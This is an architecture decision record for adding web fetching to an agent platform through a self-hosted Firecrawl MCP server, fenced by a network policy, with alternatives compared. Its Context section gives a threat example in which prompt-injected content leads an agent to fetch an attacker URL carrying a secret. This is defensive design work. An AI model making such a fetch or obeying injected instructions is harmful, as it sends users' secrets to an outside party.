# 0057: Web fetch through a self-hosted Firecrawl MCP server, fenced by its own network policy

Status: accepted, 2026-11-22 (issue #363). Builds on [0007](0007-native-remote-mcp.md) (MCP is called from the
orchestrator), [0034](0034-egress-rules.md) (rule sets, `open-web`), [0036](0036-egress-principals.md) (principals),
[0040](0040-mcp-egress-flow.md) (MCP traffic flows through OneCLI with a per-session agent) and
[0043](0043-open-onecli-defaults.md) (private MCP servers through OneCLI). No code change.

## Context

Agents need to read web pages as clean text. Sandboxes can fetch through the egress proxy (`curl`, the browser image of
[0041](0041-browser-sandbox.md)), but only in a profile with `open-web`, and they get raw HTML or have to drive a browser.
The catalog's `mcp-searxng` has a `web_url_read` tool, but that server has no internet egress, so it cannot fetch.

A fetch tool over MCP has one property whatever serves it: it fetches a **model-chosen URL** from the MCP server's network.
The orchestrator's MCP calls do not pass the egress proxy (0040), and `mcp-catalog` rules gate only the MCP host. So the
session's rule sets do not apply to the URLs fetched, and a prompt-injected `fetch https://evil.example/?d=<secret>` is not
stopped by the proxy.

Options compared (2026-11-22):

| | Self-hosted Firecrawl, own fence (chosen) | Hosted Firecrawl | Self-hosted behind the egress proxy | Sandbox fetch via proxy |
|---|---|---|---|---|
| cela code change | none | none | new principal kind, in-cluster MCP path | none |
| Per-session rules on fetched URLs | no | no | no (one shared principal) | yes |
| SSRF into the LAN or cluster | blocked by the namespace policy | none (fetches off-site) | blocked by the proxy | blocked by the proxy |
| A third party sees URLs and pages | no | yes | no | no |
| Ops | API, workers, Chromium, Redis, RabbitMQ, Postgres | none | as the first, plus proxy work | none |

## Decision

1. **Self-hosted Firecrawl with the official MCP server.** Upstream images, unmodified (Firecrawl is AGPL-3.0, the MCP
   server MIT), deployed by GitOps outside the cela chart in its own namespace (`firecrawl`), published as
   `https://firecrawl-mcp.<domain>/mcp` on the Gateway behind an API key. Nothing of Firecrawl is vendored here.
2. **Registered like any credentialed MCP server.** Catalog entry `firecrawl` with `onecliSecret` naming a OneCLI secret
   that injects the Gateway key for that host. 0040 applies unchanged: the derived `mcp-catalog` rule, the host-rule
   reconciler, a per-session `-m` agent holding only that grant, discovery through a `d-` agent. On c2 the host resolves to
   the Gateway's LoadBalancer IP, the path `mcp-searxng` already uses (0043).
3. **The fetcher is fenced by a network policy, not by the egress proxy.** The fetching pods (Firecrawl API and Playwright)
   reach `world` on TCP 80 and 443 only, with RFC 1918, CGNAT, link-local, loopback and multicast denied, the same fence as
   `sandbox-direct-allow-egress`. Cilium judges the resolved address at connect time, so a private URL, a redirect to one or
   DNS rebinding fails, and pods, Services, nodes and the Gateway are not `world`. Everything else in the namespace is
   default deny; the MCP server reaches only the API. The proxy would add only audit: a shared fetcher cannot carry
   per-session rules without passing a session identity through MCP, and making it a proxy principal is the shape 0040
   rejected for `orchestrator-mcp`.
4. **A fetch-capable MCP server is an `open-web` grant.** Name it only in profiles that also carry `open-web`. The admin
   API and console do not enforce this pairing.
5. **Private by default.** No model key (Firecrawl's LLM-backed features stay off and no model credential leaves the
   orchestrator), no telemetry keys, the MCP server's feedback tools disabled. Chromium runs under gVisor.

## Consequences

- Agents get `firecrawl_scrape`, `firecrawl_search` (through the cluster's SearXNG), `firecrawl_map` and crawl tools, as
  Markdown, with no third party in the path.
- The operator runs a six-workload stack sized for a lab (about 2 GiB requested). Queue state is ephemeral.
- Self-hosted Firecrawl has no anti-bot network: protected sites fail more often than with the hosted service.
- Fetched URLs escape per-session rules (Decision 4). A sandbox fetch through the proxy stays the governed path.
- Deployment and runbook: argo-c2 `applications/firecrawl` (README there).

## Alternatives not taken

- **Hosted Firecrawl** (`https://mcp.firecrawl.dev/v2/mcp`, bearer key through OneCLI): no ops and the best quality, but
  Firecrawl sees every URL and page. Kept as the fallback.
- **Self-hosted behind the egress proxy:** needs a new principal kind and a direct orchestrator path to in-cluster MCP
  servers, and still no per-session rules. Revisit only if per-session rules on fetched URLs become a requirement.
- **`mcp-searxng`'s `web_url_read` with internet egress:** a smaller fetcher with no JavaScript rendering; it would need
  the same fence. Firecrawl covers it.
